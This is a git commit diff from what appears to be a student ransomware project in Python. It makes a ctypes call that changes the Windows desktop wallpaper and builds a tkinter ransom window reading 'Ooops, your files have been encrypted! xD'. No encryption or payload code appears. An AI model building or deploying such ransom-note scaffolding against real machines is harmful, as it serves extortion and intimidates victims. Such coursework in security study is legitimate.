537c15ee2bf21c55949060e2b70ac50bcf18b07d
Enrique <java.zone.in.out@gmail.com>
2022-05-27 10:59:02 -0500

    Ruta relativa resuelta y añadiendo GUI

--- backgroundScreen.py
+++ backgroundScreen.py
@@ -1,3 +1,4 @@
+import images
 #Biblioteca de funciones externas para poder cambiar el fondo de pantalla
 # utilizando dll's de Windows.
 import ctypes
@@ -6,4 +7,4 @@ import ctypes
 #Parámetro de interfaz
 SPI_SETDESKWALLPAPER = 20 
 #Interfaz directa de Windows para cambiar la imagen de fondo.
-ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, r"C:\Users\enriq\Desktop\Proyecto_3_SIB\images\prueba.jpg" , 0)
+ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "images\prueba.jpg" , 0)
--- rescueWindow.py
+++ rescueWindow.py
@@ -1,3 +1,4 @@
+import images
 #Librería para los elementos de la GUI.
 import tkinter as tk  	
 
@@ -9,7 +10,22 @@ class rescueWindow(object):
     
     def crearVentana(self):	#Método para crear la ventana.
         self.Ventana.title("R4Ns0mW4r3 d3cr1pt0R 2.0")	#Título de la ventana.
+        #self.Ventana.overrideredirect(1) #Esconde la barra superior.
         self.Ventana.attributes('-toolwindow', True) #No permite modificar atributos de la ventana.
-        self.Ventana.geometry("750x750+300+50")	#Tamaño de la ventana.
+        self.Ventana.geometry("1000x750+300+50")	#Tamaño de la ventana.
         self.Ventana.configure(bg = "Red")		#Color de fondo.
+
+        #Etiqueta de encabezado.
+        encabezado = tk.Label(self.Ventana, text="Ooops, your files have been encrypted! xD", font="Verdana 18 bold")
+        #Configuración de color de fondo y de la fuente de etiqueta.
+        encabezado.config(bg="Red",fg="white")
+        #Añadiendo el elemento a la ventana.
+        encabezado.grid(row = 0, column = 1) 
+
+        #Imagen de candado
+        imgCandado = tk.PhotoImage(file="images\candado.png")
+        etqCandado = tk.Label(image = imgCandado)
+        #Añadiendo el elemento a la ventana.
+        etqCandado.grid(row = 0, column = 0)
+        
         self.Ventana.mainloop()		#Muestra la ventana.
